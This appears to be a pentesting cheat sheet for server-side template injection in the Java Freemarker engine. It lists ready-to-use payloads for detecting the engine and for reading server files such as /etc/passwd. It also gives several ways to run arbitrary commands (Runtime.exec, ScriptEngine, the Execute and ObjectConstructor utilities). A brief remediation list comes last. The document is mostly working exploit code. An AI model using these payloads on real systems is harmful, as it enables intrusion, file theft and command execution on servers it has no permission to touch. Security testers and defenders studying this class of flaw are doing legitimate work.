# Freemarker / Java — Template Engine

## Summary
Freemarker is a popular Java template engine used in Spring MVC and other Java web frameworks.

## Identification
```freemarker
${7*7}       → 49
#{7*7}       → 49      (alternate syntax)
${7*'7'}     → Error   (Java typed)
<#assign x=7*7>${x} → 49
```

## Basic Confirmation
```freemarker
${7*7}
<#if true>YES</#if>
```

## Read Files
```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toExternalForm()}

# Using arbitrary file read via new String(FileReader)
${new String(java.io.FileReader('/etc/passwd').readAllBytes())}
```

## RCE

```freemarker
# Using Runtime.exec
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Using ScriptEngine (cleaner)
${"".class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('id')")}

# Using freemarker built-in (Freemarker 2.3.x)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Using ObjectConstructor
<#assign ac="freemarker.template.utility.ObjectConstructor"?new()>${ac("java.lang.ProcessBuilder","id").start()}
```

## Short RCE (no variable assignment)
```freemarker
${"freemarker.template.utility.Execute"?new()("id")}
```

## Remediation
- Set `new_builtin_class_resolver` to `none` or `safer`
- Disable `?new` built-in in production
- Use Freemarker 2.3.30+ with `TemplateClassResolver.SAFER_RESOLVER`
